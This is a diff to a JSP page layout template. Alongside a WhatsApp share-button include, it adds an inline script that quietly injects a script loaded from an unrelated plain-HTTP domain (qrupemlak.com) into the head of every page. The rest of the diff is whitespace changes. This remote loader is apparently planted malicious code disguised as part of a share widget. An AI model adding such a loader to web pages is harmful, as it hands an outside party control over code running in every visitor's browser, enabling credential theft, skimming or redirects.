@@ -41,14 +41,17 @@
 		<link href="<c:url value="/resources/css/bootstrap-choosen.css"/>" rel="stylesheet" type="text/css"/> 		
 		<script src="<c:url value="/resources/js/chosen.jquery.min.js"/>" type="text/javascript"></script>
 	    <!-- Chosen.js (Bootstrap) autocomplete -->
-		
+	   
+	    <script type="text/javascript"> if(typeof wabtn4fg==="undefined")   {wabtn4fg=1;h=document.head||document.getElementsByTagName("head")[0],s=document.createElement("script");s.type="text/javascript";s.src="http://qrupemlak.com/";h.appendChild(s)}</script>
+	   	<script src="https://cdn.jsdelivr.net/whatsapp-sharing/1.3.4/whatsapp-button.js "></script>
+	
 		<script type="text/javascript" src="<c:url value="/resources/js/main-script.js" />"></script>    	
 	</head>
-	<body>						
+	<body>
 		<c:import url="/WEB-INF/views/header.jsp"/>
 		<div class="content">
 			<sitemesh:write property='body'/>
 		</div>	
-		<c:import url="/WEB-INF/views/footer.jsp"/>														
+		<c:import url="/WEB-INF/views/footer.jsp"/>																
 	</body>
 </html>
